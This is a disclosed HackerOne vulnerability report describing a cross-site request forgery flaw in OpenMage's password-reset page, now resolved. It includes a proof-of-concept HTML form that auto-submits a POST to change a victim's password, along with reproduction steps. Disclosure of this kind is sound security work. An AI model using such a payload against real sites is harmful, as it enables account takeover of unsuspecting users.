---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1086752'
original_report_id: '1086752'
title: CSRF in changing password after using reset password link
weakness: Cross-Site Request Forgery (CSRF)
team_handle: openmage
created_at: '2021-01-25T14:47:04.872Z'
disclosed_at: '2021-05-27T08:55:08.327Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
asset_identifier: demo.openmage.org
asset_type: URL
max_severity: medium
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in changing password after using reset password link

## Metadata

- HackerOne Report ID: 1086752
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: openmage
- Disclosed At: 2021-05-27T08:55:08.327Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hey OpenMage, the forgot password page is not protected against CSRF attack which can lead to changing password. Use the below form  to test
```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="password123" />
    </form>
   <script>document.forms[0].submit()</script>
  </body>
</html>
```
## Steps To Reproduce:

  1. Go to  ```https://demo.openmage.org/customer/account/forgotpassword/```
  2. Enter your email  and ask for password reset link
  3. Load the password reset link and after loading it close it
  4. Now load the above form and boom, password will be changed.

## Impact

Password reset via CSRF

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
